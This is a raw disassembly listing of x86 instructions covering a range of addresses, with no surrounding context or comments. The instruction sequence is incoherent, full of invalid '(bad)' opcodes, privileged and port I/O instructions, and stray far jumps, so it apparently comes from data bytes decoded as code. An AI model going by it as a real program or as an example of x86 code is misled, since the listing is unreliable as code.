  41b2b5:	les    edx,FWORD PTR [ebp-0x19]
  41b2b8:	dec    eax
  41b2b9:	dec    edx
  41b2ba:	sbb    DWORD PTR [ebx-0x6082cdba],0x5d
  41b2c1:	in     al,dx
  41b2c2:	call   0x151bf722
  41b2c7:	mov    ds:0x7545004c,eax
  41b2cc:	nop
  41b2cd:	mov    eax,ds:0x678117ee
  41b2d2:	outs   dx,BYTE PTR ds:[esi]
  41b2d3:	push   edx
  41b2d4:	sub    ch,al
  41b2d6:	fbstp  TBYTE PTR [edi-0x78]
  41b2d9:	mov    dh,0x99
  41b2db:	fucomip st,st(1)
  41b2dd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b2de:	cwde   
  41b2df:	repnz inc esp
  41b2e1:	dec    ebp
  41b2e2:	jmp    0x41b2ab
  41b2e4:	add    eax,0xb9b2feef
  41b2e9:	popa   
  41b2ea:	rcl    BYTE PTR [edx+esi*4+0x2fcecba6],0x8
  41b2f2:	pop    ebp
  41b2f3:	fistp  WORD PTR [ebx]
  41b2f5:	imul   esi,DWORD PTR [esi+ecx*8-0x3c],0x962605f5
  41b2fd:	cdq    
  41b2fe:	sbb    ah,BYTE PTR [ebp-0x5]
  41b301:	xor    bh,BYTE PTR [edx+0x35]
  41b304:	sbb    edx,0x2a
  41b307:	fisttp QWORD PTR [esi+0x29cd956e]
  41b30d:	jg     0x41b2f2
  41b30f:	xchg   ebp,eax
  41b310:	add    BYTE PTR [ecx],dh
  41b312:	outs   dx,BYTE PTR ds:[esi]
  41b313:	mov    bl,0x3a
  41b315:	inc    ebp
  41b316:	mov    cl,0x9e
  41b318:	xlat   BYTE PTR ds:[ebx]
  41b319:	pop    esp
  41b31a:	int    0x69
  41b31c:	cmp    eax,0x29c5fd14
  41b321:	nop
  41b322:	and    dl,0x13
  41b325:	getsec 
  41b327:	test   BYTE PTR [ebp-0x58d86cf6],0x94
  41b32e:	push   edx
  41b32f:	aaa    
  41b330:	bound  ecx,QWORD PTR [esi-0x3a]
  41b333:	test   al,0xb0
  41b335:	add    BYTE PTR ds:0xea3bcfa9,0xf3
  41b33c:	nop
  41b33d:	mov    ebp,0x81699793
  41b342:	dec    esp
  41b343:	xchg   edi,eax
  41b344:	in     eax,0xf7
  41b346:	pminsw mm4,QWORD PTR [esi+ebp*1-0x20c7657d]
  41b34e:	cmp    edi,esp
  41b350:	scas   al,BYTE PTR es:[edi]
  41b351:	scas   al,BYTE PTR es:[edi]
  41b352:	mov    esp,0x2ed3ad5e
  41b357:	sub    BYTE PTR [ebx],0xa0
  41b35a:	fcomp  QWORD PTR [ebx]
  41b35c:	xchg   ecx,eax
  41b35d:	jge    0x41b31b
  41b35f:	mov    ah,0x94
  41b361:	inc    ecx
  41b362:	pusha  
  41b363:	cmp    ebx,DWORD PTR [edi-0x5b]
  41b366:	cmp    DWORD PTR [edi+0x75],esp
  41b369:	imul   ecx,DWORD PTR [ecx+0x2894e080],0x84a5221a
  41b373:	mov    ah,0xad
  41b375:	mov    cl,0x1d
  41b377:	mov    edx,DWORD PTR [edi+eiz*2-0x6105e6d3]
  41b37e:	aad    0x67
  41b380:	dec    ecx
  41b381:	dec    DWORD PTR [ecx+0x44]
  41b384:	and    BYTE PTR [edx-0x4df7747a],bh
  41b38a:	mov    DWORD PTR [edx+0x6d],esi
  41b38d:	push   edi
  41b38e:	aaa    
  41b38f:	mov    eax,ds:0xf86206e5
  41b394:	adc    al,0x57
  41b396:	lea    ebx,[ecx]
  41b398:	mov    DWORD PTR [eax+0x5ddb92ad],edx
  41b39e:	lods   al,BYTE PTR ds:[esi]
  41b39f:	loope  0x41b388
  41b3a1:	xor    DWORD PTR [ecx-0x1],esi
  41b3a4:	test   eax,0x86acccda
  41b3a9:	rcl    dh,cl
  41b3ab:	mov    fs,WORD PTR [ecx+0xbbeac4a]
  41b3b1:	pop    edi
  41b3b2:	mov    edx,0x22e881b
  41b3b7:	jg     0x41b3e9
  41b3b9:	stos   BYTE PTR es:[edi],al
  41b3ba:	fwait
  41b3bb:	nop
  41b3bc:	xor    DWORD PTR [ebx],0xd04d0574
  41b3c2:	add    eax,0xcd4f6d51
  41b3c7:	xor    DWORD PTR [eax+0x2b04c7e3],edx
  41b3cd:	mov    eax,ebx
  41b3cf:	ret    0xc77d
  41b3d2:	jae    0x41b372
  41b3d4:	(bad)  
  41b3d5:	xor    esp,eax
  41b3d7:	dec    esi
  41b3d8:	lds    ebx,FWORD PTR [ecx]
  41b3da:	adc    eax,0xc24c693f
  41b3df:	ja     0x41b424
  41b3e1:	cmp    ebx,0xffffffeb
  41b3e4:	mov    ebx,0xfd82f450
  41b3e9:	cmp    DWORD PTR [eax-0x57],edi
  41b3ec:	or     al,BYTE PTR [edi-0x45c13d86]
  41b3f2:	cmp    ebx,DWORD PTR [edi]
  41b3f4:	or     BYTE PTR [ebx-0x11e434e5],bh
  41b3fa:	and    DWORD PTR [edx],edi
  41b3fc:	mov    ds:0x8161784d,al
  41b401:	sbb    ecx,esp
  41b403:	fisub  WORD PTR [edi]
  41b405:	jle    0x41b3e8
  41b407:	mov    ch,0xcb
  41b409:	lahf   
  41b40a:	aaa    
  41b40b:	addr16 nop
  41b40d:	push   ecx
  41b40e:	mov    dh,0xe6
  41b410:	(bad)  
  41b412:	cmp    al,0x15
  41b414:	dec    ecx
  41b415:	jle    0x41b457
  41b417:	jno    0x41b47f
  41b419:	dec    eax
  41b41a:	mov    al,0x51
  41b41c:	in     al,dx
  41b41d:	ret    0x883c
  41b420:	loope  0x41b3a7
  41b422:	inc    edx
  41b423:	cmc    
  41b424:	shr    edx,cl
  41b426:	sbb    eax,0xd9163376
  41b42b:	push   edi
  41b42c:	call   0xd319c416
  41b431:	push   0xffffff8b
  41b433:	in     al,0xfc
  41b435:	fsubp  st(3),st
  41b437:	call   0x48208c3f
  41b43c:	xchg   ebp,eax
  41b43d:	inc    ecx
  41b43e:	pusha  
  41b43f:	jmp    0xfb11:0x256e3161
  41b446:	imul   edi,DWORD PTR [ebp+0x3e],0xd8cecd75
  41b44d:	push   edi
  41b44e:	int3   
  41b44f:	js     0x41b42b
  41b451:	test   al,0x1e
  41b453:	add    bh,ch
  41b455:	dec    esi
  41b456:	mov    ds:0x2c9f1e83,eax
  41b45b:	(bad)  
  41b45c:	out    0x8b,eax
  41b45e:	pop    ecx
  41b45f:	(bad)  
  41b460:	fst    DWORD PTR [ebx]
  41b462:	mov    ebp,0x5630fea7
  41b467:	popa   
  41b468:	and    cl,cl
  41b46a:	mov    esi,0x500e4465
  41b46f:	fld    DWORD PTR [ebx+eiz*1+0x50]
  41b473:	mov    dh,0x36
  41b475:	leave  
  41b476:	jo     0x41b462
  41b478:	arpl   WORD PTR [ebp+0x6c7e5ada],sp
  41b47e:	ret    
  41b47f:	sbb    eax,ebx
  41b481:	jnp    0x41b4d1
  41b483:	je     0x41b40e
  41b485:	adc    ch,BYTE PTR [edx-0x31158537]
  41b48b:	pop    ds
  41b48c:	aaa    
  41b48d:	cmp    eax,0xf505b9bf
  41b492:	data16 mov ah,bl
  41b495:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b496:	xchg   ebx,eax
  41b497:	adc    BYTE PTR [eax],cl
  41b499:	rcr    DWORD PTR ds:0x6f1977ea,cl
  41b49f:	int3   
  41b4a0:	mov    bl,0x57
  41b4a2:	std    
  41b4a3:	add    esp,ebx
  41b4a5:	sub    BYTE PTR [eax],0xad
  41b4a8:	clc    
  41b4a9:	jne    0x41b44e
  41b4ab:	sub    BYTE PTR [ecx],ch
  41b4ad:	inc    edx
  41b4ae:	cmp    esi,DWORD PTR [esi-0x2e]
  41b4b1:	popf   
  41b4b2:	iret   
  41b4b3:	test   al,0x64
  41b4b5:	repnz stos BYTE PTR es:[edi],al
  41b4b7:	cmp    eax,0x158b38cb
  41b4bc:	inc    eax
  41b4bd:	nop
  41b4be:	or     al,0xc4
  41b4c0:	add    DWORD PTR [edx-0x79dabf37],edx
  41b4c6:	mov    esp,0xe5cd107a
  41b4cb:	adc    BYTE PTR [edx-0x64c24768],cl
  41b4d1:	jg     0x41b4b1
  41b4d3:	mov    esi,ebp
  41b4d5:	add    al,0x61
  41b4d7:	arpl   WORD PTR [eax+0xf],ax
  41b4da:	stos   BYTE PTR es:[edi],al
  41b4db:	mov    ?,WORD PTR gs:[edx+0x77]
  41b4df:	call   0xa1e3:0x2b5e5a34
  41b4e6:	adc    cl,ah
  41b4e8:	lods   al,BYTE PTR ds:[esi]
  41b4e9:	paddb  mm7,QWORD PTR [ebx+0x4f]
  41b4ed:	push   es
  41b4ee:	fldcw  WORD PTR [eax-0x51e8c6e4]
  41b4f4:	jle    0x41b4dc
  41b4f6:	push   esp
  41b4f7:	loope  0x41b4dd
  41b4f9:	imul   BYTE PTR [edi-0x72]
  41b4fc:	cmp    eax,DWORD PTR [edx+ebx*2]
  41b4ff:	fwait
  41b500:	(bad)  
  41b501:	hlt    
  41b502:	pop    esp
  41b503:	fnstcw WORD PTR [ebp-0x3ebf1944]
  41b509:	ficomp WORD PTR [edx]
  41b50b:	jle    0x41b51d
  41b50d:	fimul  WORD PTR [ebp-0x7259463f]
  41b513:	xchg   BYTE PTR [edx+0x1d341b1a],dl
  41b519:	add    bh,dl
  41b51b:	sbb    BYTE PTR [edx-0x2a],cl
  41b51e:	arpl   WORD PTR [ebp-0x3f],cx
  41b521:	scas   al,BYTE PTR es:[edi]
  41b522:	jmp    0x2d87:0xd7e7922
  41b529:	ins    BYTE PTR es:[edi],dx
  41b52a:	adc    al,0xbd
  41b52c:	rcl    BYTE PTR [edx-0x7373b5c9],cl
  41b532:	fiadd  WORD PTR [ecx]
  41b534:	inc    edx
  41b535:	lods   eax,DWORD PTR ds:[esi]
  41b536:	es ins DWORD PTR es:[edi],dx
  41b538:	daa    
  41b539:	dec    edx
  41b53a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b53b:	fbstp  TBYTE PTR [edi-0x6458043e]
  41b541:	pusha  
  41b542:	sub    al,0xda
  41b544:	cmp    eax,0x36967262
  41b549:	pop    ds
  41b54a:	push   ebx
  41b54b:	(bad)  
  41b54c:	mov    edi,0x2cccf1e1
  41b551:	js     0x41b5cc
  41b553:	fstp   TBYTE PTR es:[eax+0x565b92fb]
  41b55a:	test   al,0x7e
  41b55c:	mov    WORD PTR [eax],gs
  41b55e:	sbb    esp,DWORD PTR [eax+0x61]
  41b561:	dec    edi
  41b562:	mov    ah,0xac
  41b564:	xor    esp,esi
  41b566:	jnp    0x41b580
  41b568:	mov    ebp,0xef4a9c45
  41b56d:	mov    bh,BYTE PTR [ebx+0x46]
  41b570:	test   bl,ch
  41b572:	daa    
  41b573:	inc    eax
  41b574:	nop    eax
  41b577:	repnz xor edx,DWORD PTR [edi+0x6ea26a09]
  41b57e:	push   esp
  41b57f:	push   ds
  41b580:	mov    cl,0x7c
  41b582:	test   BYTE PTR [esi+0x7be94f5d],ch
  41b588:	xor    edx,DWORD PTR [esi-0x18]
  41b58b:	push   ebp
  41b58c:	mov    ch,0xd3
  41b58e:	pushf  
  41b58f:	popa   
  41b590:	adc    BYTE PTR [ebx],dh
  41b592:	dec    ebx
  41b593:	sbb    eax,0x2e2b4d68
  41b598:	pop    ds
  41b599:	imul   ebx,esp,0x28
  41b59c:	add    DWORD PTR ds:0xd2892c59,eax
  41b5a2:	sub    al,0xbf
  41b5a4:	cmp    DWORD PTR [ebx],ebx
  41b5a6:	in     eax,0xa1
  41b5a8:	imul   ebp,DWORD PTR [edi-0x32a8282b],0x7b
  41b5af:	adc    BYTE PTR [ebp+0x30],ch
  41b5b2:	cmp    eax,eax
  41b5b4:	jns    0x41b58a
  41b5b6:	ret    
  41b5b7:	ds push esi
  41b5b9:	adc    ebx,ebp
  41b5bb:	sar    dl,1
  41b5bd:	sub    DWORD PTR [edx+0xd0163d0],edi
  41b5c3:	mov    ebp,0xc5af480b
  41b5c8:	sub    cl,BYTE PTR [eax+esi*1]
  41b5cb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b5cc:	push   ecx
  41b5cd:	xlat   BYTE PTR ds:[ebx]
  41b5ce:	xchg   esp,eax
  41b5cf:	xchg   edx,eax
  41b5d0:	std    
  41b5d1:	cwde   
  41b5d2:	mov    gs,WORD PTR [ebx-0x3d789dbc]
  41b5d8:	ja     0x41b5a2
  41b5da:	sub    cl,ah
  41b5dc:	outs   dx,DWORD PTR ds:[esi]
  41b5dd:	jg     0x41b646
  41b5df:	sub    eax,0xd79a6094
  41b5e4:	sbb    BYTE PTR [eax+0x30],dh
  41b5e7:	mov    ah,0xcb
  41b5e9:	jo     0x41b61a
  41b5eb:	jbe    0x41b575
  41b5ed:	ss dec eax
  41b5ef:	mov    ch,0x16
  41b5f1:	mov    ebx,0x46f8a87a
  41b5f6:	or     dh,cl
  41b5f8:	and    al,0xfe
  41b5fa:	iret   
  41b5fb:	sub    esp,DWORD PTR ds:[edx-0x29]
  41b5ff:	test   DWORD PTR [ecx+0x4f],edx
  41b602:	xchg   DWORD PTR ds:0x73e857f9,edx
  41b608:	cmp    dl,BYTE PTR [bp+0x3ce2]
  41b60d:	inc    edi
  41b60e:	mov    al,ds:0x6267f497
  41b613:	inc    esp
  41b614:	or     al,0xb9
  41b616:	mov    edx,DWORD PTR [ecx-0xd]
  41b619:	mul    esi
  41b61b:	add    BYTE PTR [eax+0x5aa59402],0xd8
  41b622:	adc    DWORD PTR [edx+0x27],ebx
  41b625:	push   ecx
  41b626:	push   cs
  41b627:	mov    ecx,0x7f0114d5
  41b62c:	cmp    BYTE PTR [ecx+edx*8-0x2],cl
  41b630:	and    DWORD PTR [esp+ecx*4-0x5a],0xffffffd3
  41b635:	ins    DWORD PTR es:[edi],dx
  41b636:	jge    0x41b5ca
  41b638:	adc    al,0xf2
  41b63a:	aam    0xf8
  41b63c:	out    dx,eax
  41b63d:	imul   esp,DWORD PTR [ecx],0x7b
  41b640:	retf   0x9ff6
  41b643:	dec    ebx
  41b644:	mov    esi,0xf05dc6fc
  41b649:	mov    edi,0x402fbe11
  41b64e:	cli    
  41b64f:	xor    al,0x97
  41b651:	aam    0xfb
  41b653:	(bad)  
  41b654:	aaa    
  41b655:	ins    DWORD PTR es:[edi],dx
  41b656:	mov    edi,0x2ca8e4f8
  41b65b:	mov    dh,0x17
  41b65d:	inc    ebx
  41b65e:	out    0xaa,eax
  41b660:	adc    DWORD PTR [ebx+0x2a],0xd82a6567
  41b667:	es imul edi,esp,0xf308fa42
  41b66e:	push   edi
  41b66f:	mov    ds:0xd887a6f0,eax
  41b674:	repnz nop
  41b676:	inc    eax
  41b677:	adc    eax,0x588276a8
  41b67c:	cwde   
  41b67d:	mov    esi,0x71ea3d7d
  41b682:	fcomp  QWORD PTR [edi+0x55dd6633]
  41b688:	dec    edx
  41b689:	clc    
  41b68a:	sub    BYTE PTR [eax],dh
  41b68c:	fcmovbe st,st(2)
  41b68e:	xor    dl,BYTE PTR [eax+0x72faefde]
  41b694:	mov    ds:0x3204c8c8,eax
  41b699:	push   ecx
  41b69a:	jp     0x41b61c
  41b69c:	retf   
  41b69d:	dec    esp
  41b69e:	mov    edi,0x38c7e2bf
  41b6a3:	popw   ds
  41b6a5:	fbstp  TBYTE PTR [edx+0x3e]
  41b6a8:	adc    ch,BYTE PTR [esi+0x588f7800]
  41b6ae:	sbb    edx,edi
  41b6b0:	pusha  
  41b6b1:	test   DWORD PTR [edx+0x68],0x51a0f0c7
  41b6b8:	fcmove st,st(6)
  41b6ba:	xchg   edx,eax
  41b6bb:	mov    bh,0x80
  41b6bd:	out    dx,eax
  41b6be:	push   edx
  41b6bf:	(bad)  
  41b6c1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b6c2:	in     al,0xe7
  41b6c4:	retf   0xab33
  41b6c7:	and    BYTE PTR [edx+0x6ad91d34],bl
  41b6cd:	dec    esi
  41b6ce:	or     eax,0x1dfab637
  41b6d3:	pop    ss
  41b6d4:	out    0xc3,eax
  41b6d6:	or     al,0x81
  41b6d8:	and    al,0x9d
  41b6da:	retf   
  41b6db:	loop   0x41b6df
  41b6dd:	xchg   edx,eax
  41b6de:	adc    eax,0x2e6db04
  41b6e3:	fstp   TBYTE PTR gs:[eax+0x46d5bc56]
  41b6ea:	mov    ch,0xb1
  41b6ec:	xchg   edi,eax
  41b6ed:	retf   0x71b3
  41b6f0:	mov    ch,0x3c
  41b6f2:	cmc    
  41b6f3:	mov    dh,0x4e
  41b6f5:	fld    TBYTE PTR [ecx]
  41b6f7:	imul   edi,DWORD PTR [ebx],0xb0e84fa0
  41b6fd:	das    
  41b6fe:	sub    esp,DWORD PTR [ebx+0xa617904]
  41b704:	cmp    edi,eax
  41b706:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b707:	stos   BYTE PTR es:[edi],al
  41b708:	loop   0x41b736
  41b70a:	xor    BYTE PTR [edx],al
  41b70c:	lock add eax,0x68f9c9ea
  41b712:	mov    eax,es:0x7121c5a4
  41b718:	pop    eax
  41b719:	mov    al,0x1e
  41b71b:	jns    0x41b6f9
  41b71d:	sbb    al,0xf
  41b71f:	inc    edi
  41b720:	and    ch,al
  41b722:	pop    eax
  41b723:	pop    ds
  41b724:	mov    edx,0x4144c41a
  41b729:	adc    cl,BYTE PTR [ebx+0x6ecc481f]
  41b72f:	cmp    al,0xeb
  41b731:	and    al,bl
  41b733:	ss push ds
  41b735:	pusha  
  41b736:	sbb    eax,0xb54c7abe
  41b73b:	scas   al,BYTE PTR es:[edi]
  41b73c:	dec    eax
  41b73d:	inc    eax
  41b73e:	mov    esi,0x15bd6d55
  41b743:	stos   BYTE PTR es:[edi],al
  41b744:	mov    ch,0x8e
  41b746:	inc    ebx
  41b747:	(bad)  
  41b748:	push   ds
  41b749:	dec    esi
  41b74a:	xchg   edx,eax
  41b74b:	popa   
  41b74c:	sub    al,0xa
  41b74e:	mov    BYTE PTR [ebx-0x1650b9fe],dh
  41b754:	pop    edi
  41b755:	push   ds
  41b756:	leave  
  41b757:	sub    bh,BYTE PTR [edx]
  41b759:	mov    ch,0x7
  41b75b:	iret   
  41b75c:	xchg   esp,eax
  41b75d:	or     dh,al
  41b75f:	outs   dx,DWORD PTR ds:[esi]
  41b760:	lea    edi,[eax+0x16]
  41b763:	into   
  41b764:	cmp    DWORD PTR [ecx+esi*2+0x1e],edx
  41b768:	pop    ebp
  41b769:	imul   BYTE PTR [esi-0x36]
  41b76c:	mov    ebx,0xc3c05cab
  41b771:	jno    0x41b7aa
  41b773:	jo     0x41b7d2
  41b775:	fistp  DWORD PTR [esi]
  41b777:	stos   BYTE PTR es:[edi],al
  41b778:	int    0x6
  41b77a:	out    0x98,eax
  41b77c:	mov    esp,0xc7871e
  41b781:	js     0x41b723
  41b783:	daa    
  41b784:	inc    ecx
  41b785:	push   0xfffffffb
  41b787:	mov    al,al
  41b789:	pop    ss
  41b78a:	cmc    
  41b78b:	data16 cmc 
  41b78d:	sbb    BYTE PTR [edx+ebp*2],ah
  41b790:	inc    esi
  41b791:	jg     0x41b74c
  41b793:	ret    0x17bc
  41b796:	jne    0x41b7c8
  41b798:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b799:	iret   
  41b79a:	idiv   DWORD PTR [ebp+0x2c]
  41b79d:	iret   
  41b79e:	repnz clc 
  41b7a0:	(bad)  
  41b7a1:	fadd   QWORD PTR [ecx+esi*4]
  41b7a4:	jae    0x41b80c
  41b7a6:	rcl    BYTE PTR [edi+0x3d],0xb
  41b7aa:	and    al,0x44
  41b7ac:	xlat   BYTE PTR ds:[ebx]
  41b7ad:	out    0x16,eax
  41b7af:	mov    ebp,ss
  41b7b1:	mov    eax,ds:0xc8ba1fcb
  41b7b6:	dec    eax
  41b7b7:	aad    0x0
  41b7b9:	retf   
  41b7ba:	mov    ebx,0xeea886cb
  41b7bf:	retf   0xbee
  41b7c2:	je     0x414a881c
  41b7c8:	ret    
  41b7c9:	daa    
  41b7ca:	mov    ds:0x4be6da00,al
  41b7cf:	push   edi
  41b7d0:	inc    edx
  41b7d1:	jae    0x41b7ca
  41b7d3:	jg     0x41b7f4
  41b7d5:	sub    DWORD PTR [ecx],edx
  41b7d7:	fwait
  41b7d8:	aam    0x9d
  41b7da:	push   es
  41b7db:	mov    esp,0x566f122d
  41b7e0:	push   eax
  41b7e1:	pusha  
  41b7e2:	sbb    BYTE PTR [edx-0x30f255a2],ah
  41b7e8:	dec    esp
  41b7e9:	cmp    ch,BYTE PTR [ebx]
  41b7eb:	sub    ah,BYTE PTR [edx+eiz*1-0x4f307656]
  41b7f2:	lahf   
  41b7f3:	and    BYTE PTR [eax-0x3a699bfe],bl
  41b7f9:	add    esp,0x2dfd277a
  41b7ff:	fidiv  WORD PTR [ebx+0x3bbba2d]
  41b805:	xchg   ecx,eax
  41b806:	xchg   esp,eax
  41b807:	fidivr WORD PTR [eax-0x4d]
  41b80a:	daa    
  41b80b:	cdq    
  41b80c:	std    
  41b80d:	dec    ecx
  41b80e:	retf   0x206f
  41b811:	xlat   BYTE PTR ds:[ebx]
  41b812:	push   eax
  41b813:	or     ah,bh
  41b815:	xchg   ebp,eax
  41b816:	cmp    BYTE PTR [eax+0x113eea0a],0x45
  41b81d:	xor    esp,DWORD PTR [edi+0x1]
  41b820:	scas   eax,DWORD PTR es:[edi]
  41b821:	dec    ebp
  41b822:	jecxz  0x41b81c
  41b824:	repz arpl WORD PTR [edx+0x9],bp
  41b828:	mov    ebp,0x26500c15
  41b82d:	push   ds
  41b82e:	add    eax,ecx
  41b830:	mov    esp,0xca6eecb4
  41b835:	(bad)  
  41b836:	pop    eax
  41b837:	pop    esi
  41b838:	rcr    BYTE PTR [esi],0xb7
  41b83b:	outs   dx,DWORD PTR ds:[esi]
  41b83c:	shl    DWORD PTR [esi],cl
  41b83e:	inc    ebp
  41b83f:	pop    edx
  41b840:	adc    esp,esi
  41b842:	call   0x7d90:0xb51c952c
  41b849:	adc    BYTE PTR [esi],bl
  41b84b:	popa   
  41b84c:	xchg   esi,eax
  41b84d:	push   es
  41b84e:	dec    esp
  41b84f:	das    
  41b850:	mov    cl,0xad
  41b852:	call   0x3388:0xc6f46099
  41b859:	mov    eax,0xd6f694da
  41b85e:	mov    esi,0x3791ef72
  41b863:	aad    0x73
  41b865:	dec    eax
  41b866:	mov    cs,WORD PTR [esi]
  41b868:	rcl    DWORD PTR [edx+0x53],cl
  41b86b:	call   0xdf0e798e
  41b870:	push   0xabd0ea9e
  41b875:	xchg   ebx,eax
  41b876:	xchg   ebp,eax
  41b877:	push   ss
  41b878:	out    0x7d,eax
  41b87a:	and    al,0xe9
  41b87c:	mov    ah,0x44
  41b87e:	pop    es
  41b87f:	ds push edi
  41b881:	call   0xd468:0x7874c14c
  41b888:	xlat   BYTE PTR ds:[ebx]
  41b889:	lock cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b88b:	pop    ebp
  41b88c:	lahf   
  41b88d:	push   0x45bca386
  41b892:	mov    ds:0x9902c82,eax
  41b897:	aam    0x13
  41b899:	sbb    bh,BYTE PTR [ebx+0x50]
  41b89c:	jmp    0x41b861
  41b89e:	retf   
  41b89f:	call   0x6ca11e5d
  41b8a4:	into   
  41b8a5:	push   ecx
  41b8a6:	add    DWORD PTR fs:[edx+esi*2],esi
  41b8aa:	int3   
  41b8ab:	ror    BYTE PTR [esi+0x59],0x22
  41b8af:	adc    si,di
  41b8b2:	and    DWORD PTR [ebx],esi
  41b8b4:	jae    0x41b890
  41b8b6:	in     al,dx
  41b8b7:	outs   dx,BYTE PTR ds:[esi]
  41b8b8:	xchg   ebp,eax
  41b8b9:	rcr    DWORD PTR [ebx+0x79],1
  41b8bc:	push   cs
  41b8bd:	adc    al,0xa1
  41b8bf:	repz and ax,0xd643
  41b8c4:	(bad)  
  41b8c5:	loope  0x41b92d
  41b8c7:	push   eax
  41b8c8:	jb     0x41b902
  41b8ca:	enter  0xe343,0xbc
  41b8ce:	neg    ebp
  41b8d0:	div    DWORD PTR [edi]
  41b8d2:	dec    esp
  41b8d3:	lods   eax,DWORD PTR ds:[esi]
  41b8d4:	in     al,dx
  41b8d5:	scas   eax,DWORD PTR es:[edi]
  41b8d6:	xor    dl,BYTE PTR [edx-0x5ad86a53]
  41b8dc:	in     al,0xa7
  41b8de:	jmp    0x41b8f6
  41b8e0:	or     BYTE PTR [eax],al
  41b8e2:	bound  ebx,QWORD PTR [ebx-0x394d46f7]
  41b8e8:	push   esp
  41b8e9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b8ea:	jnp    0x41b92f
  41b8ec:	(bad)  
  41b8ed:	xchg   edi,eax
  41b8ee:	imul   ebx,DWORD PTR [esi+0x3f],0xffffffb8
  41b8f2:	jno    0x41b95a
  41b8f4:	enter  0x164f,0xdb
  41b8f8:	mov    BYTE PTR [esi],ch
  41b8fa:	outs   dx,DWORD PTR ds:[esi]
  41b8fb:	pop    edi
  41b8fc:	ret    
  41b8fd:	clc    
  41b8fe:	lods   al,BYTE PTR ds:[esi]
  41b8ff:	add    BYTE PTR [ebp-0x4c],ch
  41b902:	xchg   ebx,eax
  41b903:	fs jb  0x41b8db
  41b906:	sbb    eax,0x5486ef2
  41b90b:	rol    ebx,0x37
  41b90e:	ret    
  41b90f:	push   cs
  41b910:	jp     0x41b907
  41b912:	fisttp WORD PTR [esi-0x2a]
  41b915:	nop
  41b916:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b917:	and    al,0xbb
  41b919:	xor    DWORD PTR [ebp+0x40],eax
  41b91c:	sub    BYTE PTR [ecx+0x66fa044e],al
  41b922:	in     al,0xa6
  41b924:	mov    ch,0x4f
  41b926:	stos   DWORD PTR es:[edi],eax
  41b927:	xchg   BYTE PTR [edi-0x7ee310e9],ah
  41b92d:	cwde   
  41b92e:	or     al,0xac
  41b930:	ins    BYTE PTR es:[edi],dx
  41b931:	arpl   ax,bp
  41b933:	mov    WORD PTR [esi+0x6e],ds
  41b936:	int3   
  41b937:	and    BYTE PTR [eax],ah
  41b939:	or     al,0x17
  41b93b:	ret    0xe015
  41b93e:	ja     0x41b8d5
  41b940:	cmp    ah,bl
  41b942:	dec    edx
  41b943:	stos   BYTE PTR es:[edi],al
  41b944:	xchg   ebx,eax
  41b945:	jg     0x41b8d6
  41b947:	mov    ebx,0x8307a8f2
  41b94c:	out    dx,al
  41b94d:	cmp    eax,0xa2b7fe29
  41b952:	int    0xa
  41b954:	retf   0xcae8
  41b957:	inc    ecx
  41b958:	dec    ebx
  41b959:	out    dx,eax
  41b95a:	cli    
  41b95b:	xchg   ebx,eax
  41b95c:	lahf   
  41b95d:	jb     0x41b8e4
  41b95f:	push   ecx
  41b960:	test   BYTE PTR [eax],cl
  41b962:	jge    0x41b9a4
  41b964:	xor    al,0x77
  41b966:	mov    ds:0x1b8c2d6,al
  41b96b:	dec    ebp
  41b96c:	inc    esp
  41b96d:	popf   
  41b96e:	jno    0x41b9a7
  41b970:	or     eax,0xfe9d6727
  41b975:	dec    ebp
  41b976:	repz push ebx
  41b978:	dec    esp
  41b979:	sbb    eax,0x56264086
  41b97e:	adc    cl,bl
  41b980:	out    0xd2,al
  41b982:	and    al,0xc2
  41b984:	pop    es
  41b985:	fnstenv [edx-0x2887d625]
  41b98b:	adc    DWORD PTR [ebp+0x4c54c471],esp
  41b991:	int3   
  41b992:	push   ebp
  41b993:	xor    al,0x17
  41b995:	lahf   
  41b996:	and    edx,eax
  41b998:	push   ebp
  41b999:	test   DWORD PTR [ebx],ebp
  41b99b:	pop    ebx
  41b99c:	mov    DWORD PTR [eax+0x20],eax
  41b99f:	scas   al,BYTE PTR es:[edi]
  41b9a0:	int3   
  41b9a1:	push   edi
  41b9a2:	and    ebp,ecx
  41b9a4:	nop
  41b9a5:	mov    edi,0x4857e973
  41b9aa:	ds cdq 
  41b9ac:	dec    esi
  41b9ad:	mov    bl,0xe0
  41b9af:	mov    dh,0xbc
  41b9b1:	push   edi
  41b9b2:	fldcw  WORD PTR [edx]
  41b9b4:	and    eax,0x19e5a285
  41b9b9:	mov    ebp,0xfa4b8132
  41b9be:	pushf  
  41b9bf:	pop    ecx
  41b9c0:	iret   
  41b9c1:	sahf   
  41b9c2:	sbb    eax,0x4e3b9eeb
  41b9c7:	lahf   
  41b9c8:	push   edx
  41b9c9:	bound  esi,QWORD PTR fs:[esi]
  41b9cc:	ins    BYTE PTR es:[edi],dx
  41b9cd:	or     cl,al
  41b9cf:	imul   esi,DWORD PTR [ebp+edx*2-0x72f6b600],0x41
  41b9d7:	adc    al,0x3c
  41b9d9:	adc    DWORD PTR [ebp-0x3],esp
  41b9dc:	dec    ecx
  41b9dd:	mov    WORD PTR [ecx+0x2243625],?
  41b9e3:	fs jmp 0x995:0xfe196a77
  41b9eb:	jnp    0x41ba69
  41b9ed:	cmp    DWORD PTR [ebp-0x2c1506ae],ebx
  41b9f3:	xor    cl,BYTE PTR [edx+0x6f]
  41b9f6:	stc    
  41b9f7:	and    BYTE PTR [ebx-0x239d4c26],dl
  41b9fd:	icebp  
  41b9fe:	fld    DWORD PTR [edi-0x61ff0aa2]
  41ba04:	mov    ds:0xdc5fe7ec,al
  41ba09:	shl    BYTE PTR ds:0xb7782610,0x60
  41ba10:	jnp    0x41ba16
  41ba12:	data16 mov ch,BYTE PTR [ecx-0x137c80ff]
  41ba19:	shl    DWORD PTR [ecx+0x577b74f6],1
  41ba1f:	mov    ds:0x2109e2ae,al
  41ba24:	cmp    BYTE PTR [eax+eax*4+0x1a37529d],ch
  41ba2b:	fwait
  41ba2c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
